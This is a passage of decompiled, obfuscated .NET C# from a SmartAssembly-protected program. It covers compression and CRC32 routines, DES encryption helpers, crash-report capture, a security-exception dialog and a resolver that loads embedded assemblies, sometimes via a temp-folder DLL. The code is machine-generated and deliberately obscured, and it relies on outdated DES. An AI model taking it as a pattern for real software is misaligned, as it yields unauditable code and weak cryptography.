      __Boxed<bool> local3 = (ValueType) obj1;
      \u0023\u0023.\u0023mk(ex, (object) md, (object) numArray, (object) local1, (object) local2, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Hk([In] \u0023qc.\u0023bd obj0, [In] byte[] obj1)
  {
    try
    {
      \u0023\u0023.\u00230j(obj0.\u0023ad, obj1);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023bd bd = obj0;
      byte[] numArray = obj1;
      \u0023\u0023.\u0023Jk(ex, (object) bd, (object) numArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static byte[] \u0023Aj([In] byte[] obj0, [In] int obj1, [In] byte[] obj2, [In] byte[] obj3)
  {
    \u0023qc.\u0023Qd qd;
    \u0023qc.\u0023bd bd1;
    DateTime now;
    long num1;
    uint[] numArray1;
    uint maxValue;
    uint num2;
    int num3;
    int length;
    long position1;
    byte[] bytes;
    byte[] buffer1;
    int count1;
    byte[] buffer2;
    int count2;
    long num4;
    int srcOffset;
    byte[] dst;
    long position2;
    \u0023qc.\u0023bd bd2;
    byte[] buffer3;
    int count3;
    byte[] buffer4;
    int count4;
    long position3;
    byte[] inputBuffer1;
    ICryptoTransform cryptoTransform1;
    byte[] buffer5;
    byte[] inputBuffer2;
    ICryptoTransform cryptoTransform2;
    byte[] buffer6;
    try
    {
      byte[] array;
      try
      {
        qd = new \u0023qc.\u0023Qd();
        switch (obj1)
        {
          case 0:
            bd1 = new \u0023qc.\u0023bd();
            now = DateTime.Now;
            num1 = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
            numArray1 = new uint[256]
            {
              0U,
              1996959894U,
              3993919788U,
              2567524794U,
              124634137U,
              1886057615U,
              3915621685U,
              2657392035U,
              249268274U,
              2044508324U,
              3772115230U,
              2547177864U,
              162941995U,
              2125561021U,
              3887607047U,
              2428444049U,
              498536548U,
              1789927666U,
              4089016648U,
              2227061214U,
              450548861U,
              1843258603U,
              4107580753U,
              2211677639U,
              325883990U,
              1684777152U,
              4251122042U,
              2321926636U,
              335633487U,
              1661365465U,
              4195302755U,
              2366115317U,
              997073096U,
              1281953886U,
              3579855332U,
              2724688242U,
              1006888145U,
              1258607687U,
              3524101629U,
              2768942443U,
              901097722U,
              1119000684U,
              3686517206U,
              2898065728U,
              853044451U,
              1172266101U,
              3705015759U,
              2882616665U,
              651767980U,
              1373503546U,
              3369554304U,
              3218104598U,
              565507253U,
              1454621731U,
              3485111705U,
              3099436303U,
              671266974U,
              1594198024U,
              3322730930U,
              2970347812U,
              795835527U,
              1483230225U,
              3244367275U,
              3060149565U,
              1994146192U,
              31158534U,
              2563907772U,
              4023717930U,
              1907459465U,
              112637215U,
              2680153253U,
              3904427059U,
              2013776290U,
              251722036U,
              2517215374U,
              3775830040U,
              2137656763U,
              141376813U,
              2439277719U,
              3865271297U,
              1802195444U,
              476864866U,
              2238001368U,
              4066508878U,
              1812370925U,
              453092731U,
              2181625025U,
              4111451223U,
              1706088902U,
              314042704U,
              2344532202U,
              4240017532U,
              1658658271U,
              366619977U,
              2362670323U,
              4224994405U,
              1303535960U,
              984961486U,
              2747007092U,
              3569037538U,
              1256170817U,
              1037604311U,
              2765210733U,
              3554079995U,
              1131014506U,
              879679996U,
              2909243462U,
              3663771856U,
              1141124467U,
              855842277U,
              2852801631U,
              3708648649U,
              1342533948U,
              654459306U,
              3188396048U,
              3373015174U,
              1466479909U,
              544179635U,
              3110523913U,
              3462522015U,
              1591671054U,
              702138776U,
              2966460450U,
              3352799412U,
              1504918807U,
              783551873U,
              3082640443U,
              3233442989U,
              3988292384U,
              2596254646U,
              62317068U,
              1957810842U,
              3939845945U,
              2647816111U,
              81470997U,
              1943803523U,
              3814918930U,
              2489596804U,
              225274430U,
              2053790376U,
              3826175755U,
              2466906013U,
              167816743U,
              2097651377U,
              4027552580U,
              2265490386U,
              503444072U,
              1762050814U,
              4150417245U,
              2154129355U,
              426522225U,
              1852507879U,
              4275313526U,
              2312317920U,
              282753626U,
              1742555852U,
              4189708143U,
              2394877945U,
              397917763U,
              1622183637U,
              3604390888U,
              2714866558U,
              953729732U,
              1340076626U,
              3518719985U,
              2797360999U,
              1068828381U,
              1219638859U,
              3624741850U,
              2936675148U,
              906185462U,
              1090812512U,
              3747672003U,
              2825379669U,
              829329135U,
              1181335161U,
              3412177804U,
              3160834842U,
              628085408U,
              1382605366U,
              3423369109U,
              3138078467U,
              570562233U,
              1426400815U,
              3317316542U,
              2998733608U,
              733239954U,
              1555261956U,
              3268935591U,
              3050360625U,
              752459403U,
              1541320221U,
              2607071920U,
              3965973030U,
              1969922972U,
              40735498U,
              2617837225U,
              3943577151U,
              1913087877U,
              83908371U,
              2512341634U,
              3803740692U,
              2075208622U,
              213261112U,
              2463272603U,
              3855990285U,
              2094854071U,
              198958881U,
              2262029012U,
              4057260610U,
              1759359992U,
              534414190U,
              2176718541U,
              4139329115U,
              1873836001U,
              414664567U,
              2282248934U,
              4279200368U,
              1711684554U,
              285281116U,
              2405801727U,
              4167216745U,
              1634467795U,
              376229701U,
              2685067896U,
              3608007406U,
              1308918612U,
              956543938U,
              2808555105U,
              3495958263U,
              1231636301U,
              1047427035U,
              2932959818U,
              3654703836U,
              1088359270U,
              936918000U,
              2847714899U,
              3736837829U,
              1202900863U,
              817233897U,
              3183342108U,
              3401237130U,
              1404277552U,
              615818150U,
              3134207493U,
              3453421203U,
              1423857449U,
              601450431U,
              3009837614U,
              3294710456U,
              1567103746U,
              711928724U,
              3020668471U,
              3272380065U,
              1510334235U,
              755167117U
            };
            maxValue = uint.MaxValue;
            num2 = maxValue;
            num3 = 0;
            length = obj2.Length;
            while (--length >= 0)
              num2 = numArray1[(IntPtr) (uint) (((int) num2 ^ (int) obj2[num3++]) & (int) byte.MaxValue)] ^ num2 >> 8;
            num2 ^= maxValue;
            \u0023\u0023.\u0023Xj(qd, 67324752);
            \u0023\u0023.\u00237i(qd, 20);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 8);
            \u0023\u0023.\u0023Xj(qd, (int) num1);
            \u0023\u0023.\u0023Xj(qd, (int) num2);
            position1 = qd.Position;
            \u0023\u0023.\u0023Xj(qd, 0);
            \u0023\u0023.\u0023Xj(qd, obj2.Length);
            bytes = Encoding.UTF8.GetBytes("{data}");
            \u0023\u0023.\u00237i(qd, bytes.Length);
            \u0023\u0023.\u00237i(qd, 0);
            qd.Write(bytes, 0, bytes.Length);
            \u0023\u0023.\u0023Hk(bd1, obj2);
            while (!\u0023\u0023.\u0023Fk(bd1))
            {
              buffer1 = new byte[512];
              count1 = \u0023\u0023.\u00231k(buffer1, bd1);
              if (count1 > 0)
                qd.Write(buffer1, 0, count1);
              else
                break;
            }
            \u0023\u0023.\u0023Nj(bd1);
            while (!\u0023\u0023.\u0023Rj(bd1))
            {
              buffer2 = new byte[512];
              count2 = \u0023\u0023.\u00231k(buffer2, bd1);
              if (count2 > 0)
                qd.Write(buffer2, 0, count2);
              else
                break;
            }
            num4 = \u0023\u0023.\u0023ni(bd1);
            \u0023\u0023.\u0023Xj(qd, 33639248);
            \u0023\u0023.\u00237i(qd, 20);
            \u0023\u0023.\u00237i(qd, 20);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 8);
            \u0023\u0023.\u0023Xj(qd, (int) num1);
            \u0023\u0023.\u0023Xj(qd, (int) num2);
            \u0023\u0023.\u0023Xj(qd, (int) num4);
            \u0023\u0023.\u0023Xj(qd, obj2.Length);
            \u0023\u0023.\u00237i(qd, bytes.Length);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u0023Xj(qd, 0);
            \u0023\u0023.\u0023Xj(qd, 0);
            qd.Write(bytes, 0, bytes.Length);
            \u0023\u0023.\u0023Xj(qd, 101010256);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 0);
            \u0023\u0023.\u00237i(qd, 1);
            \u0023\u0023.\u00237i(qd, 1);
            \u0023\u0023.\u0023Xj(qd, 46 + bytes.Length);
            \u0023\u0023.\u0023Xj(qd, (int) ((long) (30 + bytes.Length) + num4));
            \u0023\u0023.\u00237i(qd, 0);
            qd.Seek(position1, SeekOrigin.Begin);
            \u0023\u0023.\u0023Xj(qd, (int) num4);
            break;
          case 1:
            \u0023\u0023.\u0023Xj(qd, 25000571);
            \u0023\u0023.\u0023Xj(qd, obj2.Length);
            for (srcOffset = 0; srcOffset < obj2.Length; srcOffset += dst.Length)
            {
              dst = new byte[Math.Min(2097151, obj2.Length - srcOffset)];
              Buffer.BlockCopy((Array) obj2, srcOffset, (Array) dst, 0, dst.Length);
              position2 = qd.Position;
              \u0023\u0023.\u0023Xj(qd, 0);
              \u0023\u0023.\u0023Xj(qd, dst.Length);
              bd2 = new \u0023qc.\u0023bd();
              \u0023\u0023.\u0023Hk(bd2, dst);
              while (!\u0023\u0023.\u0023Fk(bd2))
              {
                buffer3 = new byte[512];
                count3 = \u0023\u0023.\u00231k(buffer3, bd2);
                if (count3 > 0)
                  qd.Write(buffer3, 0, count3);
                else
                  break;
              }
              \u0023\u0023.\u0023Nj(bd2);
              while (!\u0023\u0023.\u0023Rj(bd2))
              {
                buffer4 = new byte[512];
                count4 = \u0023\u0023.\u00231k(buffer4, bd2);
                if (count4 > 0)
                  qd.Write(buffer4, 0, count4);
                else
                  break;
              }
              position3 = qd.Position;
              qd.Position = position2;
              \u0023\u0023.\u0023Xj(qd, (int) \u0023\u0023.\u0023ni(bd2));
              qd.Position = position3;
            }
            break;
          case 2:
            \u0023\u0023.\u0023Xj(qd, 41777787);
            inputBuffer1 = \u0023\u0023.\u0023Aj((byte[]) null, 1, obj2, (byte[]) null);
            cryptoTransform1 = \u0023\u0023.\u0023Lk(obj3, obj0, false);
            try
            {
              buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
              qd.Write(buffer5, 0, buffer5.Length);
              break;
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          case 3:
            \u0023\u0023.\u0023Xj(qd, 58555003);
            inputBuffer2 = \u0023\u0023.\u0023Aj((byte[]) null, 1, obj2, (byte[]) null);
            cryptoTransform2 = \u0023\u0023.\u0023rk(obj3, false, obj0);
            try
            {
              buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
              qd.Write(buffer6, 0, buffer6.Length);
              break;
            }
            finally
            {
              cryptoTransform2?.Dispose();
            }
        }
        qd.Flush();
        qd.Close();
        array = qd.ToArray();
      }
      catch (Exception ex)
      {
        \u0023qc.\u0023pc = "ERR 2003: " + ex.Message;
        throw;
      }
      return array;
    }
    catch (Exception ex)
    {
      byte[] numArray2;
      object[] objArray = new object[37]
      {
        (object) qd,
        (object) bd1,
        (object) now,
        (object) num1,
        (object) numArray1,
        (object) maxValue,
        (object) num2,
        (object) num3,
        (object) length,
        (object) position1,
        (object) bytes,
        (object) buffer1,
        (object) count1,
        (object) buffer2,
        (object) count2,
        (object) num4,
        (object) srcOffset,
        (object) dst,
        (object) position2,
        (object) bd2,
        (object) buffer3,
        (object) count3,
        (object) buffer4,
        (object) count4,
        (object) position3,
        (object) inputBuffer1,
        (object) cryptoTransform1,
        (object) buffer5,
        (object) inputBuffer2,
        (object) cryptoTransform2,
        (object) buffer6,
        (object) ex,
        (object) numArray2,
        (object) obj2,
        (object) obj1,
        (object) obj0,
        (object) obj3
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0023rg \u0023Ik()
  {
    int num1 = 5;
    if (true)
      goto label_3;
label_1:
    System.Type type;
    if ((object) type.BaseType == null)
      goto label_17;
    else
      goto label_5;
label_2:
    int num2;
    num1 = num2;
label_3:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
          goto label_12;
        case 1:
        case 2:
          goto label_1;
        case 3:
          goto label_5;
        case 5:
          if (\u0023rg.\u0023gg == null)
          {
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto label_12;
          }
          else
            goto label_20;
        case 6:
          goto label_7;
        case 7:
          goto label_20;
        default:
          goto label_4;
      }
    }
label_4:
    num2 = 3;
    goto label_2;
label_7:
    System.Type[] types = Assembly.GetExecutingAssembly().GetTypes();
    int index = 0;
    goto label_18;
label_12:
    try
    {
      \u0023rg.\u0023gg = (\u0023rg) Activator.CreateInstance(type, true);
      int num3 = 2;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 2:
            goto label_13;
          case 1:
          case 3:
            goto label_20;
          default:
            if (true)
            {
              num3 = 3;
              continue;
            }
            goto label_20;
        }
      }
label_13:
      if (\u0023rg.\u0023gg == null)
        goto label_17;
    }
    catch
    {
      goto label_17;
    }
label_20:
    return \u0023rg.\u0023gg;
label_5:
    if ((object) type.BaseType == (object) typeof (\u0023rg))
    {
      num2 = 0;
      goto label_2;
    }
label_17:
    ++index;
label_18:
    if (index < types.Length)
    {
      type = types[index];
      if ((object) type != null)
      {
        num2 = 1;
        goto label_2;
      }
      else
        goto label_17;
    }
    else
    {
      num2 = 7;
      goto label_2;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Jk([In] Exception obj0, [In] object obj1, [In] object obj2) => \u0023\u0023.\u0023ji(obj0, new object[2]
  {
    obj1,
    obj2
  });

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Kk([In] \u0023hf obj0) => obj0.\u0023cf = true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static ICryptoTransform \u0023Lk([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
  {
    DESCryptoServiceProvider cryptoServiceProvider1;
    ICryptoTransform cryptoTransform1;
    try
    {
      cryptoServiceProvider1 = new DESCryptoServiceProvider();
      try
      {
        cryptoTransform1 = obj2 ? cryptoServiceProvider1.CreateDecryptor(obj1, obj0) : cryptoServiceProvider1.CreateEncryptor(obj1, obj0);
      }
      finally
      {
        cryptoServiceProvider1?.Dispose();
      }
      return cryptoTransform1;
    }
    catch (Exception ex)
    {
      DESCryptoServiceProvider cryptoServiceProvider2 = cryptoServiceProvider1;
      ICryptoTransform cryptoTransform2 = cryptoTransform1;
      byte[] numArray1 = obj1;
      byte[] numArray2 = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local = (ValueType) obj2;
      \u0023\u0023.\u0023mk(ex, (object) cryptoServiceProvider2, (object) cryptoTransform2, (object) numArray1, (object) numArray2, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Mk([In] \u0023Uf obj0)
  {
    int num1 = 5;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
        case 5:
          obj0.\u0023Jf.Enabled = false;
          num2 = 4;
          break;
        case 1:
          obj0.Refresh();
          goto case 2;
        case 2:
        case 3:
          obj0.Height = 16;
          num2 = 6;
          break;
        case 4:
          obj0.\u0023Hf = (Image) null;
          obj0.\u0023If = false;
          obj0.\u0023Lf = string.Empty;
          num1 = 1;
          continue;
        case 6:
          goto label_8;
        default:
          num2 = 2;
          break;
      }
      num1 = num2;
    }
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Nk()
  {
    try
    {
      try
      {
        \u0001.\u0001.\u0001();
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
      \u0023\u0023.\u00236i(ex);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Ok() => "SmartAssembly" + " " + (object) \u0023\u0023.\u0023aj();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Pk([In] \u0023Xh obj0)
  {
    int num1 = 14;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            obj0.\u00238f.Size = new Size(120, 32);
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 2;
              continue;
            }
            goto label_21;
          case 1:
            goto label_9;
          case 2:
            goto label_7;
          case 3:
            obj0.\u0023Th = new Button();
            if (true)
            {
              num2 = 18;
              continue;
            }
            goto label_4;
          case 4:
            goto label_4;
          case 5:
            goto label_21;
          case 6:
            obj0.\u0023Th.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            obj0.\u0023Th.FlatStyle = FlatStyle.System;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 13;
              continue;
            }
            goto label_7;
          case 7:
          case 10:
            obj0.\u0023Th.Size = new Size(100, 24);
            obj0.\u0023Th.TabIndex = 1;
            num2 = 12;
            continue;
          case 8:
            ((Control) obj0.\u0023lh).Text = "%AppName% attempted to perform an operation not allowed by the security policy.";
            obj0.\u0023rf.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            obj0.\u0023rf.FlatStyle = FlatStyle.System;
            obj0.\u0023rf.Location = new Point(20, 72);
            obj0.\u0023rf.Name = "errorMessage";
            obj0.\u0023rf.Size = new Size(382, 13);
            if (true)
            {
              num2 = 11;
              continue;
            }
            goto case 3;
          case 9:
          case 17:
            obj0.\u0023lh.Dock = DockStyle.Top;
            obj0.\u0023lh.ForeColor = System.Drawing.Color.White;
            \u0023\u0023.\u00231j(obj0.\u0023lh, \u0023Zf.\u00234f);
            \u0023\u0023.\u00230h((Image) null, obj0.\u0023lh);
            obj0.\u0023lh.Location = new Point(0, 0);
            obj0.\u0023lh.Name = "headerControl1";
            obj0.\u0023lh.Size = new Size(418, 58);
            obj0.\u0023lh.TabIndex = 7;
            obj0.\u0023lh.TabStop = false;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 8;
              continue;
            }
            goto case 7;
          case 11:
            obj0.\u0023rf.TabIndex = 14;
            obj0.\u0023rf.Text = "errorMessage";
            obj0.\u0023rf.UseMnemonic = false;
            obj0.\u00238f.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            obj0.\u00238f.Cursor = Cursors.Hand;
            obj0.\u00238f.Location = new Point(6, 186);
            obj0.\u00238f.Name = "poweredBy";
            int num3 = 0;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num3 : num3;
            continue;
          case 12:
            obj0.\u0023Th.Text = "&Continue";
            obj0.\u0023Th.Click += new EventHandler(obj0.\u0023Vh);
            obj0.\u0023lh.BackColor = System.Drawing.Color.FromArgb(36, 96, 179);
            goto case 9;
          case 13:
            obj0.\u0023Th.Location = new Point(202, 188);
            obj0.\u0023Th.Name = "continueButton";
            int num4 = 10;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num4 : num4;
            continue;
          case 14:
            goto label_12;
          case 15:
            obj0.Controls.Add((Control) obj0.\u00238f);
            obj0.FormBorderStyle = FormBorderStyle.FixedSingle;
            obj0.MaximizeBox = false;
            obj0.MinimizeBox = false;
            obj0.Name = "SecurityExceptionForm";
            obj0.ShowInTaskbar = false;
            if (true)
            {
              num2 = 16;
              continue;
            }
            goto case 12;
          case 16:
            goto label_5;
          case 18:
            goto label_8;
          case 19:
            goto label_19;
          default:
            num2 = 17;
            continue;
        }
      }
label_4:
      obj0.\u0023rf = new \u0023Ef();
      obj0.\u00238f = new \u00238f();
      obj0.SuspendLayout();
      obj0.\u0023Uh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      num1 = 1;
      continue;
label_5:
      obj0.StartPosition = FormStartPosition.CenterScreen;
      obj0.Text = "%AppName%";
      obj0.ResumeLayout(false);
      num1 = 19;
      continue;
label_7:
      obj0.\u00238f.TabIndex = 15;
      obj0.\u00238f.TabStop = false;
      obj0.\u00238f.Text = "poweredBy1";
      obj0.AutoScaleBaseSize = new Size(5, 13);
      obj0.BackColor = SystemColors.Window;
      obj0.ClientSize = new Size(418, 224);
      obj0.ControlBox = false;
      obj0.Controls.Add((Control) obj0.\u0023Th);
      obj0.Controls.Add((Control) obj0.\u0023Uh);
      num1 = 5;
      continue;
label_8:
      obj0.\u0023lh = new \u00232f();
      num1 = 4;
      continue;
label_9:
      obj0.\u0023Uh.FlatStyle = FlatStyle.System;
      obj0.\u0023Uh.Location = new Point(308, 188);
      obj0.\u0023Uh.Name = "quitButton";
      obj0.\u0023Uh.Size = new Size(100, 24);
      obj0.\u0023Uh.TabIndex = 0;
      obj0.\u0023Uh.Text = "&Quit";
      obj0.\u0023Uh.Click += new EventHandler(obj0.\u0023Wh);
      num1 = 6;
      continue;
label_12:
      obj0.\u0023Uh = new Button();
      num1 = 3;
      continue;
label_21:
      obj0.Controls.Add((Control) obj0.\u0023lh);
      obj0.Controls.Add((Control) obj0.\u0023rf);
      num1 = 15;
    }
label_19:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
  static void \u0023Qk([In] \u0023rg obj0)
  {
    int num = 3;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 1:
          \u0023rg.\u0023gg = obj0;
          goto case 2;
        case 2:
        case 4:
          AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(obj0.\u0023lg);
          Application.ThreadException += new ThreadExceptionEventHandler(obj0.\u0023kg);
          num = 5;
          continue;
        case 3:
          if (obj0 != null)
          {
            num = 0;
            continue;
          }
          goto label_7;
        case 5:
          goto label_8;
        default:
          num = 4;
          continue;
      }
    }
label_7:
    return;
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Rk(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5,
    [In] object obj6,
    [In] object obj7,
    [In] object obj8)
  {
    \u0023\u0023.\u0023ji(obj0, new object[8]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5,
      obj6,
      obj7,
      obj8
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Sk([In] Exception obj0, [In] \u0023Te obj1)
  {
    using (new \u00231g(obj1.\u0023Ae, "Exception"))
    {
      try
      {
        System.Type type = obj0.GetType();
        obj1.\u0023Oe(type);
        string str1 = "N/A";
        try
        {
          str1 = obj0.Message;
        }
        catch
        {
        }
        obj1.\u0023Ae.WriteAttributeString("Message", str1);
        string str2 = obj0.StackTrace.Trim();
        obj1.\u0023Ae.WriteAttributeString("ExceptionStackTrace", str2);
        int num = str2.IndexOf(' ');
        string str3 = str2.Substring(num + 1);
        int length = str3.IndexOf("\r\n");
        if (length != -1)
          str3 = str3.Substring(0, length);
        obj1.\u0023Ae.WriteAttributeString("Method", str3);
        obj1.\u0023Le(new \u00238e((object) obj0, true));
      }
      catch
      {
      }
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Assembly \u0023Tk(object _param0, ResolveEventArgs _param1)
  {
    \u0023ac.\u0023gc gc;
    string s;
    string base64String;
    char[] chArray;
    string[] strArray;
    string str1;
    bool flag1;
    bool flag2;
    int index1;
    int index2;
    int num1;
    string str2;
    Dictionary<string, Assembly> dictionary;
    Assembly assembly1;
    Stream manifestResourceStream;
    int length;
    byte[] numArray;
    Assembly assembly2;
    string path1;
    string path2;
    FileStream fileStream;
    try
    {
      gc = new \u0023ac.\u0023gc(_param1.Name);
      s = gc.\u0023ec(false);
      base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
      chArray = new char[1]{ ',' };
      strArray = "ezNkODhjZTQ0LTg2MDgtNDk2NS05OGM0LWVmYTEzY2I3ODZiYn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{9673a94a-ebdd-446e-802e-0ba0c48d221b},ezNkODhjZTQ0LTg2MDgtNDk2NS05OGM0LWVmYTEzY2I3ODZiYn0=,[z]{9673a94a-ebdd-446e-802e-0ba0c48d221b}".Split(chArray);
      str1 = string.Empty;
      flag1 = false;
      flag2 = false;
      for (index1 = 0; index1 < strArray.Length - 1; index1 += 2)
      {
        if (strArray[index1] == base64String)
        {
          str1 = strArray[index1 + 1];
          break;
        }
      }
      if (str1.Length == 0 && gc.\u0023dc.Length == 0)
      {
        base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(gc.\u0023B));
        for (index2 = 0; index2 < strArray.Length - 1; index2 += 2)
        {
          if (strArray[index2] == base64String)
          {
            str1 = strArray[index2 + 1];
            break;
          }
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          num1 = str1.IndexOf(']');
          str2 = str1.Substring(1, num1 - 1);
          flag1 = str2.IndexOf('z') >= 0;
          flag2 = str2.IndexOf('t') >= 0;
          str1 = str1.Substring(num1 + 1);
        }
        Monitor.Enter((object) (dictionary = \u0023ac.\u00234b));
        try
        {
          if (\u0023ac.\u00234b.ContainsKey(str1))
          {
            assembly1 = \u0023ac.\u00234b[str1];
          }
          else
          {
            manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
            if (manifestResourceStream != null)
            {
              length = (int) manifestResourceStream.Length;
              numArray = new byte[length];
              manifestResourceStream.Read(numArray, 0, length);
              if (flag1)
                numArray = \u0023\u0023.\u00234j(numArray);
              assembly2 = (Assembly) null;
              if (!flag2)
              {
                try
                {
                  assembly2 = Assembly.Load(numArray);
                }
                catch (FileLoadException ex)
                {
                  flag2 = true;
                }
                catch (BadImageFormatException ex)
                {
                  flag2 = true;
                }
              }
              if (flag2)
              {
                try
                {
                  path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                  int num2 = 5;
                  while (true)
                  {
                    int num3;
                    switch (num2)
                    {
                      case 0:
                      case 5:
                        Directory.CreateDirectory(path1);
                        path2 = path1 + gc.\u0023B + ".dll";
                        num2 = 1;
                        continue;
                      case 1:
                        if (!System.IO.File.Exists(path2))
                        {
                          fileStream = System.IO.File.OpenWrite(path2);
                          goto case 4;
                        }
                        else
                          goto label_34;
                      case 2:
                      case 3:
                        \u0023\u0023.\u0023bj(path1, (string) null, 4);
                        num3 = 6;
                        break;
                      case 4:
                        fileStream.Write(numArray, 0, numArray.Length);
                        fileStream.Close();
                        \u0023\u0023.\u0023bj(path2, (string) null, 4);
                        num2 = 2;
                        continue;
                      case 6:
                        goto label_34;
                      default:
                        num3 = 4;
                        break;
                    }
                    num2 = num3;
                  }
label_34:
                  assembly2 = Assembly.LoadFile(path2);
                }
                catch
                {
                }
              }
              \u0023ac.\u00234b[str1] = assembly2;
              assembly1 = assembly2;
            }
            else
              goto label_38;
          }
        }
        finally
        {
          Monitor.Exit((object) dictionary);
        }
        return assembly1;
      }
label_38:
      return (Assembly) null;
    }
    catch (Exception ex)
    {
      object[] objArray = new object[23]
      {
        (object) gc,
        (object) s,
        (object) base64String,
        (object) strArray,
        (object) str1,
        (object) flag1,
        (object) flag2,
        (object) index1,
        (object) index2,
        (object) num1,
        (object) str2,
        (object) manifestResourceStream,
        (object) length,
        (object) numArray,
        (object) assembly2,
        (object) path1,
        (object) path2,
        (object) fileStream,
        (object) assembly1,
        (object) chArray,
        (object) dictionary,
        _param0,
        (object) _param1
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Uk([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Vk([In] int obj0, [In] int obj1, [In] \u0023qc.\u0023md obj2)
  {
    int index1;
    int num1;
    int index2;
    try
    {
      obj2.\u0023ed[obj2.\u0023gd] = (short) obj1;
      int num2 = 2;
      while (true)
      {
        int num3 = num2;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 2:
              goto label_7;
            case 1:
              if (index1 >= 265 && index1 < 285)
              {
                if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
                {
                  num3 = 4;
                  continue;
                }
                goto label_7;
              }
              else
                break;
            case 3:
            case 4:
              obj2.\u0023hd += (index1 - 261) / 4;
              break;
            case 5:
              ++obj2.\u0023dd.\u0023nd[index1];
              goto case 1;
            case 6:
              goto label_11;
            default:
              int num4 = 1;
              num3 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num4 : num4;
              continue;
          }
          index2 = \u0023\u0023.\u0023gj(obj2, obj1 - 1);
          ++obj2.\u0023Fc.\u0023nd[index2];
          if (index2 >= 4)
          {
            obj2.\u0023hd += index2 / 2 - 1;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              num3 = 6;
            else
              goto label_11;
          }
          else
            goto label_11;
        }
label_7:
        byte[] fd = obj2.\u0023fd;
        num1 = obj2.\u0023gd++;
        int index3 = num1;
        int num5 = (int) (byte) (obj0 - 3);
        fd[index3] = (byte) num5;
        index1 = \u0023\u0023.\u0023sj(obj0 - 3, obj2);
        num2 = 5;
      }
label_11:
      return \u0023\u0023.\u0023Di(obj2);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) index2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num1;
      \u0023qc.\u0023md md = obj2;
      // ISSUE: variable of a boxed type
